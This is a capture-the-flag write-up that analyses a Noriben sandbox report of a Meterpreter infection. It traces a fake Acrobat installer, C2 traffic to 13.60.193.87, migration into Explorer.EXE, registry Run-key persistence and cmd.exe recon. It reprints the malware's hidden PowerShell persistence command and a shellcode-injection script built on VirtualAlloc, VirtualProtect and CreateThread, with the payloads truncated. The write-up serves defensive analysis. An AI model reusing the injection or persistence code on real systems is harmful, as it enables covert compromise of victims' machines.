## Challenge SCENARIO

> We identified active malware in one of our Windows servers. We isolated it and executed the malware in our honeypot. Analyze the generated report and answer the questions to help us understand how the malware works.

The report was generated by **Noriben**, a Python-based sandbox analysis tool that hooks into Windows process monitoring (via Procmon) and logs all process creation, file activity, registry changes, and network traffic produced by a malware sample during execution.

## Step-by-Step Analysis

---

### Question 1 — Initial Malicious Process

**Answer: `Acrobat32_reader.exe`**

The very first section of the Noriben report is **Processes Created**. Scanning through it, the suspicious entry immediately stands out:

```
[CreateProcess] Explorer.EXE:4620 > "%UserProfile%\Downloads\Acrobat32_reader.exe"
    [Child PID: 3884]
```

A file named `Acrobat32_reader.exe` living in the user's `Downloads` folder and launched by Explorer is a classic phishing/trojan pattern — a fake Adobe Acrobat installer used to trick the victim into executing the payload.

This is further confirmed in the **Network Traffic** section, where the first C2 connection is directed straight at this process:

```
[TCP] 13.60.193.87:80 > Acrobat32_reader.exe:3884
```

---

### Question 2 — Attacker's IP and Protocol

**Answer: `13.60.193.87_TCP`**

In the **Network Traffic** section at the bottom of the Noriben report:

```
[TCP] 13.60.193.87:80 > Acrobat32_reader.exe:3884
[TCP] 13.60.193.87:443 > Explorer.EXE:4620
[TCP] Explorer.EXE:4620 > 13.60.193.87:443
```

The attacker's IP is **13.60.193.87**, and the protocol is **TCP**. The initial beacon from the malware back to the C2 server uses port 80, while subsequent encrypted C2 traffic shifts to port 443 — a common Meterpreter pattern to blend in with legitimate HTTPS traffic.

All other network connections in the report belong to legitimate system processes (Windows Update, Microsoft Edge, SmartScreen, etc.) and can be ruled out.

---

### Question 3 — Process the Attacker Migrated To

**Answer: `Explorer.EXE`**

This question tests understanding of **process migration**, a core Meterpreter/Metasploit technique. After gaining initial access via `Acrobat32_reader.exe`, the attacker migrates the Meterpreter session into a more stable, less suspicious process to avoid detection and maintain persistence.

Two pieces of evidence confirm the migration target:

**1. Network traffic shifts from `Acrobat32_reader.exe` to `Explorer.EXE`:**

```
[TCP] 13.60.193.87:80  > Acrobat32_reader.exe:3884   ← initial beacon
[TCP] 13.60.193.87:443 > Explorer.EXE:4620            ← post-migration C2
[TCP] Explorer.EXE:4620 > 13.60.193.87:443            ← bidirectional C2
```

**2. Post-migration activity originates from `Explorer.EXE`:**

All attacker-controlled actions after migration — spawning `cmd.exe`, writing registry persistence, running recon commands — are attributed to `Explorer.EXE:4620`:

```
[CreateProcess] Explorer.EXE:4620 > cmd.exe              [Child PID: 3404]
[RegSetValue]   Explorer.EXE:4620 > HKCU\SOFTWARE\76fiQjA1\erIyfJl7 = <base64>
[RegSetValue]   Explorer.EXE:4620 > HKCU\...\Run\2yGbMgAv = <powershell command>
```

`Explorer.EXE` is a favorite migration target because it's always running, runs in the user context, and blends in perfectly with normal system activity.

### Question 4 — Variable Storing the Final Base64 Payload

**Answer: `rw`**

This is the most complex question and requires **multi-layer payload analysis**.

#### Layer 1: Registry Persistence

The malware writes two registry entries:

```
HKCU\SOFTWARE\76fiQjA1\erIyfJl7 = <very large base64 blob>

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\2yGbMgAv =
    %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c
    "sleep 0; iex([System.Text.Encoding]::Unicode.GetString(
        [System.Convert]::FromBase64String(
            (Get-Item 'HKCU:Software\76fiQjA1').GetValue('erIyfJl7')
        )
    ))"
```

The **Run key** (`2yGbMgAv`) ensures execution on every login. It reads the base64 blob from registry value `erIyfJl7` and decodes + executes it as PowerShell. This is the **outer payload**.

#### Layer 2: Decode the Outer Base64 (UTF-16LE)

The outer base64 stored in `erIyfJl7` is UTF-16LE encoded (standard for Windows PowerShell). Decoding it reveals a **PowerShell launcher script**:

```powershell
if([IntPtr]::Size -eq 4){ $b='powershell.exe' }
else { $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe' }

$s = New-Object System.Diagnostics.ProcessStartInfo
$s.FileName = $b
$s.Arguments = '-noni -nop -w hidden -c &([scriptblock]::create(
    (New-Object System.IO.StreamReader(
        New-Object System.IO.Compression.GzipStream(
            (New-Object System.IO.MemoryStream(,
                [System.Convert]::FromBase64String(
                    ((...large b64 string...)-f'=','U','1')
                )
            )),
            [System.IO.Compression.CompressionMode]::Decompress
        )
    )).ReadToEnd()
))'
$s.UseShellExecute=$false; $s.RedirectStandardOutput=$true
$s.WindowStyle='Hidden'; $s.CreateNoWindow=$true
$p = [System.Diagnostics.Process]::Start($s)
```

This script launches a **hidden PowerShell process** that decodes another base64 string (with string format substitution tricks applied via `-f '=','U','1'`) and **gzip-decompresses** it before executing the result.

#### Layer 3: Decompress the Inner Payload

After reconstructing the inner base64 string (applying `{0}→'='`, `{1}→'U'`, `{2}→'1'` substitutions) and gzip-decompressing it, we get the **final shellcode injection script**:

```powershell
function xEq { ... }   # GetProcAddress wrapper
function lwQVj { ... } # Dynamic delegate creation

[Byte[]]$rw = [System.Convert]::FromBase64String(
    "/OiPAAAAYInlMdJki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcd..."
)

[Uint32]$sPu = 0

$akNn = [Marshal]::GetDelegateForFunctionPointer(
    (xEq kernel32.dll VirtualAlloc),
    (lwQVj @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, $rw.Length, 0x3000, 0x04)

[Marshal]::Copy($rw, 0, $akNn, $rw.length)

if (([Marshal]::GetDelegateForFunctionPointer(
    (xEq kernel32.dll VirtualProtect), ...
).Invoke($akNn, [Uint32]$rw.Length, 0x10, [Ref]$sPu)) -eq $true) {

    $jdiW = [Marshal]::GetDelegateForFunctionPointer(
        (xEq kernel32.dll CreateThread), ...
    ).Invoke([IntPtr]::Zero, 0, $akNn, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    [Marshal]::GetDelegateForFunctionPointer(
        (xEq kernel32.dll WaitForSingleObject), ...
    ).Invoke($jdiW, 0xffffffff)
}
```

The variable **`$rw`** holds the final base64-decoded shellcode (a Meterpreter reverse shell payload). The script:

1. Calls `VirtualAlloc` to allocate RW memory
2. Copies `$rw` shellcode into it
3. Calls `VirtualProtect` to make it executable (RX)
4. Calls `CreateThread` to execute it
5. Calls `WaitForSingleObject` to wait for it to complete

### Question 5 — PID of Process Used for System Commands

**Answer: `3404`**

After migrating into `Explorer.EXE`, the attacker spawns a `cmd.exe` process to run recon commands:

```
[CreateProcess] Explorer.EXE:4620 > cmd.exe     [Child PID: 3404]
[CreateProcess] cmd.exe:3404 > "systeminfo"     [Child PID: 784]
[CreateProcess] cmd.exe:3404 > "whoami"         [Child PID: 5584]
```

`cmd.exe` with **PID 3404** is the shell spawned by the attacker. It then executes `systeminfo` and `whoami` as child processes — standard Meterpreter post-exploitation recon to fingerprint the victim machine (OS version, user privileges, domain membership, etc.).

## Full Attack Chain Summary

```
1. INITIAL ACCESS
   Victim runs Acrobat32_reader.exe (PID 3884) from Downloads
   └─ Malware connects to C2: 13.60.193.87:80 [TCP]

2. PROCESS MIGRATION
   Meterpreter migrates into Explorer.EXE (PID 4620)
   └─ C2 traffic shifts to: 13.60.193.87:443 [TCP]

3. PERSISTENCE
   Explorer.EXE writes to registry:
   ├─ HKCU\SOFTWARE\76fiQjA1\erIyfJl7
   │   └─ Outer base64 payload (UTF-16LE PowerShell launcher)
   └─ HKCU\...\Run\2yGbMgAv
       └─ Reads erIyfJl7 and executes it on every login

4. PAYLOAD CHAIN
   Run key → PowerShell → decodes erIyfJl7
           → launches hidden PS child process
           → decodes + decompresses inner gzip/b64
           → executes shellcode injector
           → $rw (shellcode) allocated via VirtualAlloc
           → made executable via VirtualProtect
           → executed via CreateThread

5. RECON
   Explorer.EXE spawns cmd.exe (PID 3404)
   ├─ systeminfo  (PID 784)
   └─ whoami      (PID 5584)
```

## Key Takeaways

- **Noriben reports** are structured into four sections: Processes, File Activity, Registry Activity, and Network Traffic. Always start with Processes and Network Traffic to identify the malicious actor quickly.
- **Process migration** is a hallmark of Meterpreter. Look for a PID that suddenly starts generating C2 traffic that wasn't there before.
- **Multi-layer payloads** (base64 → gzip → base64 → shellcode) are standard obfuscation. Decode each layer methodically.
- **Registry Run keys** are one of the most common Windows persistence mechanisms. A randomly-named key under `HKCU\...\Run` containing a PowerShell `iex` call is an immediate red flag.
- The **`-f` string format operator** in PowerShell is commonly abused to break up base64 strings and evade static signature detection.
